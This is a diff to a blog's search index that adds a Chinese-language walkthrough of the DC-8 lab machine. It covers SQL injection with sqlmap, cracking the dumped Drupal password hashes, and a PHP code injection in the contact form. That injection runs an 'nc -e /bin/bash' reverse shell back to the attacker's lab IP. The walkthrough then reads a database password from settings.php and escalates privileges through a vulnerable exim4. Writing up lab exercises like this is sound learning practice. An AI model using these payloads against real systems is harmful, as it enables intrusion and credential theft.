@@ -5733,6 +5733,49 @@ insert into test1 value(3,15);
   <entry>
     <title>DC-8</title>
     <url>/2021/06/17/DC-8/</url>
+    <content><![CDATA[<p>IP确认：192.168.243.134</p>
+<p>打开网页的时候看到<a class="link" href="http://192.168.243.134/?nid=1">http://192.168.243.134/?nid=1<i class="fas fa-external-link-alt"></i></a> 有个id<br>在searchsploit查的时候看到好几个注入</p>
+<p><img src="image-20210617132751781.png" alt="image-20210617132751781"></p>
+<p>就直接丢sqlmap跑了<br>一步一步查过去，<br>有两个库<br>d7db,information_schema<br>d7db下面有给users表，里面有admin和john两个用户的信息</p>
+<pre><code>+---------+---------------------------------------------------------+
+| name    | pass                                                    |
++---------+---------------------------------------------------------+
+| &lt;blank&gt; | &lt;blank&gt;                                                 |
+| admin   | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |
+| john    | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |
++---------+---------------------------------------------------------+
+</code></pre>
+<p><img src="image-20210617133348566.png" alt="image-20210617133348566"></p>
+<p>登录入口虽然在页面不见了，但还是在的<br>192.168.243.134/user</p>
+<p>把密码用john解密</p>
+<p><img src="image-20210617150600575.png" alt="image-20210617150600575"></p>
+<p>密码解密出来一个turtle<br>测试是john的密码<br>    john<br>    turtle</p>
+<p>登录进去后，在contact us的编辑那里找到了可以反弹shell的地方，但是我自己用的时候，把</p><p>flag</p>给删掉了，结果就用不了，后面看了别人的才成功<br>先编写好要执行的命令，我这边是直接反弹shell<br>所以写的是<p></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;flag&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;nc -e /bin/bash 192.168.243.130 4444&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p><img src="image-20210617161947709.png" alt="image-20210617161947709"></p>
+<p>保存后，去contact us随便提交一点什么东西</p>
+<p><img src="image-20210617162115369.png" alt="image-20210617162115369"><br>kali这边就接收到了shell了</p>
+<p><img src="image-20210617162143755.png" alt="image-20210617162143755"></p>
+<p>用  python -c ‘import pty; pty.spawn(“/bin/bash”)’<br>获取一个完全交互的shell</p>
+<p>然后又是翻箱倒柜的找有用的信息<br>依然是在/var/www/html/sites/default/settings.php里找到了数据库密码<br>    dbuser<br>    4nB90JumP</p>
+<p><img src="image-20210617162411546.png" alt="image-20210617162411546"></p>
+<p>连进去找了一会才想起来,我就是用的注入进来的.<br>在继续翻箱倒柜找<br>sudo -l需要www-data的密码<br>find /* -perm -u=s -type f 2&gt;/dev/null的结果如下</p>
+<p><img src="image-20210617171914113.png" alt="image-20210617171914113"></p>
+<p>在看passwd文件的时候,发现有这个用户Debian-exim</p>
+<p><img src="image-20210617172107085.png" alt="image-20210617172107085"></p>
+<p>结合上面用find找到的exim4,这里应该有问题,</p>
+<p>百度查了一下:<a class="link" href="https://blog.csdn.net/qq_34965596/article/details/104658544">https://blog.csdn.net/qq_34965596/article/details/104658544<i class="fas fa-external-link-alt"></i></a></p>
+<p>然后就成了</p>
+<p><img src="image-20210617172931950.png" alt="image-20210617172931950"></p>
+<p><img src="image-20210617173526965.png" alt="image-20210617173526965"></p>
+<p>值得一提的是,这个shell很不稳定</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>DC-9</title>
+    <url>/2021/06/17/DC-9/</url>
     <content><![CDATA[]]></content>
   </entry>
 </search>
